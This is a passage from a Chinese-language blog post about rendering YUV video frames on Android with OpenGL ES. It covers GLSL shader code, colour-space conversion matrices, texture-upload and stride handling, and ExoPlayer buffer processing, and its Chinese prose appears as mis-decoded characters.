        <span class="hljs-comment">// Semi-Planar (NV12/NV21/NV16): ä»ä¸€ä¸ªå…±äº«çº¹ç†ä¸­é‡‡æ · UV æˆ– VU</span>
        <span class="hljs-type">vec4</span> <span class="hljs-variable">uv_data</span> <span class="hljs-operator">=</span> texture2D(s_texture_u, v_texCoord); <span class="hljs-comment">// s_texture_u è¢«ç”¨äº UV/VU</span>

        <span class="hljs-keyword">if</span> (u_format_type == <span class="hljs-number">1</span>) {
            <span class="hljs-comment">// NV12 (UVUV...) -&gt; U=R, V=G</span>
            U = uv_data.r;
            V = uv_data.a;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(u_format_type == <span class="hljs-number">2</span>){
            <span class="hljs-comment">// NV21 (VUVU...) -&gt; V=R, U=G</span>
            V = uv_data.r;
            U = uv_data.a;
        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(u_format_type == <span class="hljs-number">4</span>){
            <span class="hljs-comment">// NV12 æˆ– NV16 - é€»è¾‘å®Œå…¨ä¸€æ ·ï¼</span>
            <span class="hljs-comment">// texture_u å®é™…ä¸Šå­˜çš„æ˜¯ UVUV...</span>
             U = uv_data.r;
             V = uv_data.a;
        }
    }

    <span class="hljs-comment">// 3. YUV åˆ° RGB è½¬æ¢ (BT.601 æ ‡å‡†)</span>
    <span class="hljs-comment">// ç§»é™¤æ‰€æœ‰çš„ 'f' åç¼€</span>

    <span class="hljs-comment">// è°ƒæ•´ YUV èŒƒå›´åˆ°ä¸­å¿ƒç‚¹</span>
    Y = <span class="hljs-number">1.1643</span> * (Y - <span class="hljs-number">0.0625</span>);
    U = U - <span class="hljs-number">0.5</span>;
    V = V - <span class="hljs-number">0.5</span>;

    <span class="hljs-comment">// YUV è½¬æ¢çŸ©é˜µåº”ç”¨äºè°ƒæ•´åçš„ Y, U, V (BT.601)</span>
 <span class="hljs-comment">//  float R = Y + 1.596 * V;</span>
  <span class="hljs-comment">// float G = Y - 0.391 * U - 0.813 * V;</span>
  <span class="hljs-comment">// float B = Y + 2.018 * U;</span>

   vec3 yuv;
   yuv.x = Y;
   yuv.y = U;
   yuv.z = V;

    <span class="hljs-comment">// 4. è¾“å‡ºæœ€ç»ˆé¢œè‰²</span>
   <span class="hljs-comment">// gl_FragColor = vec4(R, G, B, 1.0);</span>
    gl_FragColor = vec4(colorFormatMatrix * yuv, <span class="hljs-number">1.0</span>);
}
</code></pre>
<p>å½“ç„¶ï¼Œä¸Šé¢æåˆ°äº†è‰²å½©ç©ºé—´ï¼Œæˆ‘ä»¬åœ¨çº¹ç†ä¼ è¾“æ—¶ï¼Œä¼šæä¾›3x3çš„çŸ©é˜µ</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">float</span>[] kColorConversion601 = {
        <span class="hljs-number">1.164f</span>, <span class="hljs-number">1.164f</span>, <span class="hljs-number">1.164f</span>,
        <span class="hljs-number">0.0f</span>, -<span class="hljs-number">0.392f</span>, <span class="hljs-number">2.017f</span>,
        <span class="hljs-number">1.596f</span>, -<span class="hljs-number">0.813f</span>, <span class="hljs-number">0.0f</span>,
};

<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">float</span>[] kColorConversion709 = {
        <span class="hljs-number">1.164f</span>, <span class="hljs-number">1.164f</span>, <span class="hljs-number">1.164f</span>,
        <span class="hljs-number">0.0f</span>, -<span class="hljs-number">0.213f</span>, <span class="hljs-number">2.112f</span>,
        <span class="hljs-number">1.793f</span>, -<span class="hljs-number">0.533f</span>, <span class="hljs-number">0.0f</span>,
};

<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">float</span>[] kColorConversion2020 = {
        <span class="hljs-number">1.168f</span>, <span class="hljs-number">1.168f</span>, <span class="hljs-number">1.168f</span>,
        <span class="hljs-number">0.0f</span>, -<span class="hljs-number">0.188f</span>, <span class="hljs-number">2.148f</span>,
        <span class="hljs-number">1.683f</span>, -<span class="hljs-number">0.652f</span>, <span class="hljs-number">0.0f</span>,
};
</code></pre>
<h3 data-id="heading-3">GLYUVSurfaceViewå®ç°</h3>
<h4 data-id="heading-4">ä¼ è¾“åŸç†</h4>
<p>æœ‰äº†è„šæœ¬ï¼Œæˆ‘ä»¬åªéœ€è¦æŒ‰éƒ¨å°±ç­å®ç°GLSurfaceViewï¼Œä½†çº¹ç†ä¸Šä¼ ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ä¸‹OPEN GLä¸Šä¼ çš„æ•°æ®ç±»å‹ï¼Œå•ä¸€ç±»å‹çš„çº¹ç†ï¼Œéƒ½æ˜¯é€šè¿‡GLES20.GL_LUMINANCEå®ç°ä¸Šä¼ ï¼Œè€Œå¯¹äºUVUVæˆ–è€…UVUVäº¤é”™çš„ç±»å‹ï¼Œä½¿ç”¨GLES20.GL_LUMINANCEï¼ˆæ˜äº®åº¦ï¼Œå¯ä»¥ä½œä¸ºå•ä¸€ç±»å‹å¦‚Yã€Uã€Vã€Rã€Gã€Bä¼ è¾“ï¼‰æ˜¾ç„¶åœ¨Shaderæ— æ³•å‡†ç¡®æå–å‡ºUå’ŒVåˆ†é‡ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>å®é™…ä¸Šï¼ŒOpen GL ES æä¾›äº†ä¸€ä¸ªæ•°æ®ç±»å‹GLES20.GL_LUMINANCE_ALPHAï¼Œå’ŒGLES20.GL_LUMINANCEç›¸æ¯”GLES20.GL_LUMINANCE_ALPHAæ˜¯æ¯2ä¸ªå­—èŠ‚ä½œä¸ºä¸€ç»„ï¼Œè€Œå‰è€…æ˜¯å•ä¸€å­—èŠ‚ï¼Œå¦‚æœä½¿ç”¨GLES20.GL_LUMINANCEä¼šå‡ºç°ç½‘æ ¼ç°è±¡ï¼ˆYåˆ†ç¦»æ­£å¸¸ï¼ŒUVåˆ†é‡å¤„ç†ä¸å½“å‡ºç°ç”»é¢ç½‘æ ¼ï¼‰ï¼Œé‚£ä¹ˆGLES20.GL_LUMINANCE_ALPHAæ­£å¥½å¯ä»¥äº¤é”™å®ç°UVUVUV...æˆ–è€…VUVUVU...è¿™æ ·çš„ä¼ è¾“ï¼Œè€Œä¸”åœ¨GLä¸­èƒ½å¤Ÿç›´æ¥æå–Uåˆ†é‡å’ŒVåˆ†é‡ã€‚</p>
<h4 data-id="heading-5">å…·ä½“å®ç°</h4>
<p>ä¸‹é¢æ˜¯GLSurfaceViewæ ¸å¿ƒé€»è¾‘ï¼Œæˆ‘ä»¬ä¼šå®ç°YUV420ï¼ˆNV21ã€NV12ã€PLANARï¼‰ã€YUV422ï¼ˆäº¤é”™ã€PLANARï¼‰çš„Bufferæ•°æ®ç›´æ¥ä¼ è¾“è‡³GPUï¼Œç„¶ååœ¨GPUä¸Šè¿›è¡Œæ ¼å¼è½¬æ¢</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æ ¸å¿ƒï¼šè®¡ç®—å¸ƒå±€ã€å¤„ç† Strideï¼ˆé›¶æ‹·è´å¤±è´¥æ—¶ï¼‰å¹¶ä¸Šä¼ çº¹ç†ã€‚
 */</span>
<span class="hljs-comment">/**
 * æ ¸å¿ƒï¼šè®¡ç®—å¸ƒå±€ã€å¤„ç† Stride å¹¶ä¸Šä¼ çº¹ç†ã€‚
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uploadYuvTextures</span><span class="hljs-params">(ByteBuffer fullBuffer, <span class="hljs-type">int</span> format, <span class="hljs-type">int</span> width, <span class="hljs-type">int</span> height, <span class="hljs-type">int</span> stride)</span> {
    <span class="hljs-type">YuvFormat</span> <span class="hljs-variable">formatType</span> <span class="hljs-operator">=</span> getFormatType(format);

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">yStride</span> <span class="hljs-operator">=</span> stride;
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">yWidth</span> <span class="hljs-operator">=</span> width;
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">yHeight</span> <span class="hljs-operator">=</span> height;

    <span class="hljs-comment">// --- 1. åŒºåˆ† 420 å’Œ 422 ---</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">is422</span> <span class="hljs-operator">=</span> (formatType == YuvFormat.PLANAR_422 || formatType == YuvFormat.NV16);

    <span class="hljs-comment">// --- 2. è®¡ç®—è‰²åº¦(Chroma)å¹³é¢çš„å°ºå¯¸ ---</span>
    <span class="hljs-comment">// å®½åº¦ï¼šæ— è®ºæ˜¯ 420 è¿˜æ˜¯ 422ï¼ŒUV å®½åº¦é€šå¸¸éƒ½æ˜¯ Y çš„ä¸€åŠ</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">cWidth</span> <span class="hljs-operator">=</span> (width + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;

    <span class="hljs-comment">// é«˜åº¦ï¼š420 æ˜¯ Y çš„ä¸€åŠï¼Œ422 ä¸ Y ç›¸åŒ</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">cHeight</span> <span class="hljs-operator">=</span> is422 ? height : (height + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;

    <span class="hljs-comment">// Strideï¼šPlanar æ¨¡å¼ä¸‹é€šå¸¸æ˜¯ Y stride çš„ä¸€åŠ</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">cStride</span> <span class="hljs-operator">=</span> stride / <span class="hljs-number">2</span>;

    <span class="hljs-type">int</span> uOffset, vOffset;

    <span class="hljs-comment">// --- 3. æ ¹æ®æ ¼å¼è®¡ç®—åç§»é‡ ---</span>
    <span class="hljs-keyword">switch</span> (formatType) {
        <span class="hljs-keyword">case</span> PLANAR:
        <span class="hljs-keyword">case</span> PLANAR_422: <span class="hljs-comment">// é€»è¾‘ç›¸åŒï¼Œåªæ˜¯ cHeight å˜äº†</span>
            uOffset = yStride * height;
            vOffset = uOffset + cStride * cHeight;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> NV12:
        <span class="hljs-keyword">case</span> NV16: <span class="hljs-comment">// é€»è¾‘ç›¸åŒï¼ŒNV16 çš„ UV å¹³é¢é«˜åº¦æ˜¯ NV12 çš„ä¸¤å€</span>
            uOffset = yStride * height;
            vOffset = -<span class="hljs-number">1</span>; <span class="hljs-comment">// ä¸ä½¿ç”¨</span>
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> NV21:
            vOffset = yStride * height;
            uOffset = -<span class="hljs-number">1</span>; <span class="hljs-comment">// ä¸ä½¿ç”¨</span>
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:
            <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// --- 4. ä¸Šä¼  Y çº¹ç† (Texture Unit 0) ---</span>
    fullBuffer.position(<span class="hljs-number">0</span>);
    GLES20.glActiveTexture(GLES20.GL_TEXTURE0);
    GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, textureIds[<span class="hljs-number">0</span>]);
    uploadPlane(fullBuffer, yStride, yWidth, yHeight, GLES20.GL_LUMINANCE);

    <span class="hljs-keyword">try</span> {
        GlUtil.checkGlError();
    } <span class="hljs-keyword">catch</span> (GlUtil.GlException e) {
        <span class="hljs-comment">// é”™è¯¯å¤„ç†...</span>
    }

    <span class="hljs-comment">// --- 5. ä¸Šä¼  U/V æˆ– UV çº¹ç† ---</span>
    <span class="hljs-keyword">if</span> (formatType == YuvFormat.PLANAR || formatType == YuvFormat.PLANAR_422) {
        <span class="hljs-comment">// Planar: U (T1) å’Œ V (T2) åˆ†å¼€</span>

        <span class="hljs-comment">// ä¸Šä¼  U</span>
        fullBuffer.position(uOffset);
        GLES20.glActiveTexture(GLES20.GL_TEXTURE1);
        GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, textureIds[<span class="hljs-number">1</span>]);
        uploadPlane(fullBuffer, cStride, cWidth, cHeight, GLES20.GL_LUMINANCE);

        <span class="hljs-comment">// ä¸Šä¼  V</span>
        fullBuffer.position(vOffset);
        GLES20.glActiveTexture(GLES20.GL_TEXTURE2);
        GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, textureIds[<span class="hljs-number">2</span>]);
        uploadPlane(fullBuffer, cStride, cWidth, cHeight, GLES20.GL_LUMINANCE);

    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Semi-Planar (NV12/NV21/NV16): UV äº¤é”™ (T1)</span>

        <span class="hljs-comment">// å¯¹äº NV12/NV16ï¼ŒUV æ•°æ®äº¤é”™å­˜æ”¾ï¼Œå®½åº¦çœ‹ä¼¼æ˜¯ cWidthï¼Œä½†æ¯ä¸ªåƒç´ æœ‰2ä¸ªå­—èŠ‚(Uå’ŒV)</span>
        <span class="hljs-comment">// åœ¨ GL_LUMINANCE_ALPHA æ ¼å¼ä¸‹ï¼Œçº¹ç†å®½åº¦ = cWidthï¼Œçº¹ç†é«˜åº¦ = cHeight</span>
        <span class="hljs-comment">// å†…å­˜ä¸­çš„è¡Œå®½ (Stride) é€šå¸¸ç­‰äº Y çš„ Stride</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">uvStride</span> <span class="hljs-operator">=</span> yStride;
        <span class="hljs-type">int</span> <span class="hljs-variable">uvPlaneWidth</span> <span class="hljs-operator">=</span> cWidth;

        <span class="hljs-type">int</span> <span class="hljs-variable">uvOffset</span> <span class="hljs-operator">=</span> (formatType == YuvFormat.NV12 || formatType == YuvFormat.NV16) ? uOffset : vOffset;
        fullBuffer.position(uvOffset);

        GLES20.glActiveTexture(GLES20.GL_TEXTURE1);
        GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, textureIds[<span class="hljs-number">1</span>]);

        <span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œä½¿ç”¨ GL_LUMINANCE_ALPHAï¼Œä¸€ä¸ªçº¹ç†åƒç´ åŒ…å« (Luminance, Alpha) å³ (U, V)</span>
        uploadPlane(fullBuffer, uvStride, uvPlaneWidth, cHeight, GLES20.GL_LUMINANCE_ALPHA);

        <span class="hljs-comment">// ç¦ç”¨ç¬¬ä¸‰ä¸ªçº¹ç†å•å…ƒ</span>
        GLES20.glActiveTexture(GLES20.GL_TEXTURE2);
        GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, <span class="hljs-number">0</span>);
    }

    currentFormat = formatType;
}
</code></pre>
<p>å½“ç„¶ï¼ŒuploadPlaneçš„æºç åŒæ ·é‡è¦ï¼Œæ­¤éƒ¨ä»½å†³å®šç”»é¢æ˜¯å¦ä¼šå€¾æ–œã€é»‘å±ã€æˆ–è€…èŠ±å±ï¼Œä¸‹é¢æ˜¯å®Œæ•´æºç ï¼Œä¸è¿‡åœ¨å®é™…çš„å®ç°ä¸­ï¼Œæˆ‘ä»¬è¦è€ƒè™‘planeStrideå¤§äºæ•°æ®è¡Œçš„é—®é¢˜ï¼Œå¯¹ç©ºè¡Œæ•°æ®è¿›è¡Œå¡«å……ï¼Œé˜²æ­¢é”™ä½ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ã€å…³é”®å‡½æ•°ã€‘è¾…åŠ©å‡½æ•°ï¼šä¸Šä¼ å•ä¸ªå¹³é¢çº¹ç†ï¼Œæ”¯æŒ GLES 3.0 é›¶æ‹·è´å’Œ GLES 2.0 å›é€€ã€‚
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uploadPlane</span><span class="hljs-params">(ByteBuffer buffer, <span class="hljs-type">int</span> planeStride, <span class="hljs-type">int</span> planeWidth, <span class="hljs-type">int</span> planeHeight, <span class="hljs-type">int</span> glFormat)</span> {
    GLES20.glPixelStorei(GLES20.GL_UNPACK_ALIGNMENT, <span class="hljs-number">1</span>);
    <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">localBuffer</span> <span class="hljs-operator">=</span> buffer.duplicate();
    <span class="hljs-type">int</span> <span class="hljs-variable">bytesPerPixel</span> <span class="hljs-operator">=</span> (glFormat == GLES20.GL_LUMINANCE_ALPHA) ? <span class="hljs-number">2</span> : <span class="hljs-number">1</span>;
    <span class="hljs-type">int</span> <span class="hljs-variable">actualDataBytesPerRow</span> <span class="hljs-operator">=</span> planeWidth * bytesPerPixel;

    <span class="hljs-keyword">if</span> (planeStride &gt; actualDataBytesPerRow) {
        <span class="hljs-keyword">if</span> (glVersion &gt;= <span class="hljs-number">3</span>) {
            GLES30.glPixelStorei(GLES30.GL_UNPACK_ROW_LENGTH, planeStride);

            GLES20.glTexImage2D(
                    GLES20.GL_TEXTURE_2D, <span class="hljs-number">0</span>, glFormat,
                    planeWidth, planeHeight, <span class="hljs-number">0</span>,
                    glFormat, GLES20.GL_UNSIGNED_BYTE, localBuffer.slice());

            GLES30.glPixelStorei(GLES30.GL_UNPACK_ROW_LENGTH, <span class="hljs-number">0</span>);

            buffer.position(buffer.position() + planeStride * planeHeight);

        } <span class="hljs-keyword">else</span> {
            <span class="hljs-type">int</span> <span class="hljs-variable">paddingBytes</span> <span class="hljs-operator">=</span> planeStride - actualDataBytesPerRow;

            <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">cleanBuffer</span> <span class="hljs-operator">=</span> ByteBuffer.allocateDirect(planeWidth * planeHeight * bytesPerPixel)
                    .order(ByteOrder.nativeOrder());

            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; planeHeight; i++) {
                localBuffer.limit(localBuffer.position() + actualDataBytesPerRow);
                cleanBuffer.put(localBuffer.slice());
                localBuffer.position(localBuffer.position() + paddingBytes);
            }

            cleanBuffer.flip();

            GLES20.glTexImage2D(
                    GLES20.GL_TEXTURE_2D, <span class="hljs-number">0</span>, glFormat,
                    planeWidth, planeHeight, <span class="hljs-number">0</span>,
                    glFormat, GLES20.GL_UNSIGNED_BYTE, cleanBuffer);

            <span class="hljs-comment">// æ¨è¿›åŸå§‹ buffer çš„ position</span>
            buffer.position(buffer.position() + planeStride * planeHeight);
        }

    } <span class="hljs-keyword">else</span> {
       <span class="hljs-comment">//strideç­‰äºwidthçš„æƒ…å†µï¼Œå®Œç¾ï¼Œç›´æ¥ä¸Šä¼ </span>
        localBuffer.limit(localBuffer.position() + planeStride * planeHeight);
        buffer.position(buffer.position() + planeStride * planeHeight);

        GLES20.glTexImage2D(
                GLES20.GL_TEXTURE_2D, <span class="hljs-number">0</span>, glFormat,
                planeWidth, planeHeight, <span class="hljs-number">0</span>,
                glFormat, GLES20.GL_UNSIGNED_BYTE, localBuffer.slice());
    }
}
</code></pre>
<p>ä»¥ä¸Šæ˜¯Shaderå’Œçº¹ç†ä¼ è¾“çš„æ ¸å¿ƒé€»è¾‘ï¼Œå½“ç„¶ï¼ŒGLä»…ä»…å®ç°ä¼ è¾“æ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸ºæˆ‘ä»¬è¿˜éœ€è¦å®ç°é¡¶ç‚¹åæ ‡ï¼ˆä¸–ç•Œåæ ‡ç³»ï¼‰å’Œç€è‰²å™¨åæ ‡çš„ç»‘å®šã€‚</p>
<p>æ¥ä¸‹æ¥å®ç°ä¸€ä¸‹onDrawFrame</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDrawFrame</span><span class="hljs-params">(GL10 gl)</span> {
    <span class="hljs-comment">// ... (onDrawFrame é€»è¾‘ä¸å˜) ...</span>
    <span class="hljs-meta">@Nullable</span>
    <span class="hljs-type">VideoDecoderOutputBuffer</span> <span class="hljs-variable">pendingOutputBuffer</span> <span class="hljs-operator">=</span>
            pendingOutputBufferReference.getAndSet(<span class="hljs-comment">/* newValue= */</span> <span class="hljs-literal">null</span>);
    <span class="hljs-keyword">if</span> (pendingOutputBuffer == <span class="hljs-literal">null</span> &amp;&amp; renderedOutputBuffer == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">if</span> (pendingOutputBuffer != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">if</span> (renderedOutputBuffer != <span class="hljs-literal">null</span>) {
            renderedOutputBuffer.release();
        }
        renderedOutputBuffer = pendingOutputBuffer;
    }

    <span class="hljs-keyword">final</span> <span class="hljs-type">VideoDecoderOutputBuffer</span> <span class="hljs-variable">outputBuffer</span> <span class="hljs-operator">=</span> checkNotNull(renderedOutputBuffer);
    <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> outputBuffer.data;
    <span class="hljs-type">int</span> <span class="hljs-variable">format</span> <span class="hljs-operator">=</span> outputBuffer.decoderPrivate;
    <span class="hljs-type">int</span> <span class="hljs-variable">frameWidth</span> <span class="hljs-operator">=</span> outputBuffer.width;
    <span class="hljs-type">int</span> <span class="hljs-variable">frameHeight</span> <span class="hljs-operator">=</span> outputBuffer.height;
    <span class="hljs-type">int</span> <span class="hljs-variable">stride</span> <span class="hljs-operator">=</span> outputBuffer.yuvStrides[<span class="hljs-number">0</span>];

    GLES20.glClear(GLES20.GL_COLOR_BUFFER_BIT);
    <span class="hljs-keyword">if</span> (buffer != <span class="hljs-literal">null</span> &amp;&amp; frameWidth &gt; <span class="hljs-number">0</span> &amp;&amp; frameHeight &gt; <span class="hljs-number">0</span>) {
       <span class="hljs-comment">//å¤„ç†é¢œè‰²ç©ºé—´ï¼ˆä¸»è¦æ˜¯ç”»é¢é¥±å’Œåº¦ï¼‰</span>
        <span class="hljs-type">float</span>[] colorConversion = kColorConversion709;
        <span class="hljs-keyword">switch</span> (outputBuffer.colorspace) {
            <span class="hljs-keyword">case</span> VideoDecoderOutputBuffer.COLORSPACE_BT601:
                colorConversion = kColorConversion601;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> VideoDecoderOutputBuffer.COLORSPACE_BT2020:
                colorConversion = kColorConversion2020;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> VideoDecoderOutputBuffer.COLORSPACE_BT709:
            <span class="hljs-keyword">default</span>:
                <span class="hljs-comment">// Do nothing.</span>
                <span class="hljs-keyword">break</span>;
        }
        GLES20.glUniformMatrix3fv(
                colorFormatMatrix,
                <span class="hljs-comment">/* color= */</span> <span class="hljs-number">1</span>,
                <span class="hljs-comment">/* transpose= */</span> <span class="hljs-literal">false</span>,
                colorConversion,
                <span class="hljs-comment">/* offset= */</span> <span class="hljs-number">0</span>);

        uploadYuvTextures(buffer, format, frameWidth, frameHeight, stride);
    }

    <span class="hljs-keyword">if</span> (frameWidth &gt; <span class="hljs-number">0</span> &amp;&amp; frameHeight &gt; <span class="hljs-number">0</span>) {
        GLES20.glUseProgram(programHandle);

        GLES20.glUniform1i(formatTypeUniform, currentFormat.getType());

        <span class="hljs-type">int</span> <span class="hljs-variable">positionHandle</span> <span class="hljs-operator">=</span> GLES20.glGetAttribLocation(programHandle, <span class="hljs-string">"a_position"</span>);
        GLES20.glEnableVertexAttribArray(positionHandle);
        GLES20.glVertexAttribPointer(positionHandle, <span class="hljs-number">2</span>, GLES20.GL_FLOAT, <span class="hljs-literal">false</span>, <span class="hljs-number">0</span>, vertexBuffer);

        <span class="hljs-type">int</span> <span class="hljs-variable">texCoordHandle</span> <span class="hljs-operator">=</span> GLES20.glGetAttribLocation(programHandle, <span class="hljs-string">"a_texCoord"</span>);
        GLES20.glEnableVertexAttribArray(texCoordHandle);
        GLES20.glVertexAttribPointer(texCoordHandle, <span class="hljs-number">2</span>, GLES20.GL_FLOAT, <span class="hljs-literal">false</span>, <span class="hljs-number">0</span>, textureBuffer);

        GLES20.glDrawArrays(GLES20.GL_TRIANGLE_STRIP, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);

        GLES20.glDisableVertexAttribArray(positionHandle);
        GLES20.glDisableVertexAttribArray(texCoordHandle);
    }
}
</code></pre>
<p>ä¸Šé¢å°±æ˜¯GLVideoSurfaceViewçš„æ ¸å¿ƒé€»è¾‘äº†ï¼Œè¿™é‡Œæä¸€ä¸‹ColorSpaceï¼ˆé¢œè‰²ç©ºé—´ï¼‰ï¼Œé¢œè‰²ç©ºé—´é»˜è®¤æƒ…å†µéƒ½BT709ï¼Œç”¨äºå†³å®šç”»é¢çš„é¥±å’Œåº¦å’Œè‰²å½©é²œè‰³ç¨‹åº¦ï¼Œå¤„ç†ä¸å½“å®¹æ˜“ç”»é¢å¤±çœŸï¼Œä¸‹é¢æˆ‘ä»¬ä¹Ÿä¼šè®²åˆ°ã€‚</p>
<h2 data-id="heading-6">Exo VideoRenderé€‚é…</h2>
<p>æ—¢ç„¶æ¸²æŸ“éƒ¨åˆ†å®ç°ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è¯¥å®ç°è¿™éƒ¨åˆ†ï¼Œåœ¨ä¹‹å‰çš„é‚£ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬ç”¨CPUåšäº†å¤§é‡çš„å·¥ä½œï¼Œä¸è¿‡ç¼ºç‚¹æ˜¾è€Œæ˜“è§ã€‚</p>
<p>ä½œä¸º1å¸§1920x1080çš„æ•°æ®ï¼Œç®—æ³•å¤æ‚åº¦ä¸ºO(w*h+width)ï¼ŒåŒæ—¶ä¸€å¸§æ•°æ®å æ¯”2.79MBï¼Œåœ¨CPUä¸­è¿ç®—ï¼Œå†…å­˜å’ŒCPUè´Ÿè½½å¾ˆé«˜ã€‚</p>
<h3 data-id="heading-7">YUV Bufferæ•°æ®å¤„ç†</h3>
<p>ä¸ºäº†ä¿æŒè°ƒè¯•çš„éœ€è¦ï¼Œæˆ‘ä»¬ä¹Ÿä¼šä¿ç•™CPUæ¸²æŸ“çš„æ–¹å¼ï¼ŒåŒæ—¶æ–°å¢GPUçš„æ–¹å¼ï¼Œå½“ç„¶ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„GLVideoSurfaceViewåŸºæœ¬ä¿æŒä¸€ä¸ªï¼ŒåŒæ—¶decoderPrivateç”¨æ¥è¡¨ç¤ºColorSpaceï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯yuvI420ToGpuå‡½æ•°ä¸­ï¼Œ
decoderOutputBuffer.decoderPrivateå¼ºåˆ¶è®¾ç½®ä¸ºCodecCapabilities.COLOR_FormatYUV420Planarï¼Œå› ä¸ºCPUè½¬æ¢åçš„å°±æ˜¯YUV420Planarç»“æ„ï¼Œå¦‚æœè¿™ä¸ªé”™è¯¯è®¾ç½®ï¼Œå¿…ç„¶å¯¼è‡´ç°ç™½å›¾åƒä¸­ç»¿æ¡é—ªçƒã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDrainOutputBuffer</span><span class="hljs-params">(MediaCodecAdapter codec,ByteBuffer decodeOutputBuffer, <span class="hljs-type">int</span> index, <span class="hljs-type">long</span> presentationTimeUs)</span> {
  <span class="hljs-keyword">if</span>(isGPUTransform){
    rawYuvToGpu(codec, decodeOutputBuffer, presentationTimeUs);
  }<span class="hljs-keyword">else</span> {
    yuvI420ToGpu(codec, decodeOutputBuffer, presentationTimeUs);
  }
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rawYuvToGpu</span><span class="hljs-params">(MediaCodecAdapter codec, ByteBuffer decodeOutputBuffer, <span class="hljs-type">long</span> presentationTimeUs)</span> {
  <span class="hljs-keyword">if</span>(decodeOutputBuffer != <span class="hljs-literal">null</span>){
    <span class="hljs-type">MediaFormat</span> <span class="hljs-variable">outputFormat</span> <span class="hljs-operator">=</span> codec.getOutputFormat();
    <span class="hljs-type">int</span> <span class="hljs-variable">colorFormat</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_COLOR_FORMAT);
    <span class="hljs-type">int</span> <span class="hljs-variable">width</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_WIDTH);
    <span class="hljs-type">int</span> <span class="hljs-variable">height</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_HEIGHT);

    <span class="hljs-type">int</span> <span class="hljs-variable">alignWidth</span> <span class="hljs-operator">=</span> width;
    <span class="hljs-type">int</span> <span class="hljs-variable">alignHeight</span> <span class="hljs-operator">=</span> height;
    <span class="hljs-type">boolean</span> <span class="hljs-variable">isDebug</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

    <span class="hljs-type">int</span> <span class="hljs-variable">stride</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_STRIDE);
    <span class="hljs-type">int</span> <span class="hljs-variable">sliceHeight</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_SLICE_HEIGHT);
    <span class="hljs-keyword">if</span> (stride &gt; <span class="hljs-number">0</span> &amp;&amp; sliceHeight &gt; <span class="hljs-number">0</span>) {
      alignWidth = stride;
      alignHeight = sliceHeight;
    }

    <span class="hljs-type">int</span> <span class="hljs-variable">decodeOutputBufferSize</span>  <span class="hljs-operator">=</span> decodeOutputBuffer.limit();
    <span class="hljs-type">ByteBufferHolder</span> <span class="hljs-variable">finalBufferHolder</span> <span class="hljs-operator">=</span> byteBufferPool.obtain(decodeOutputBufferSize);
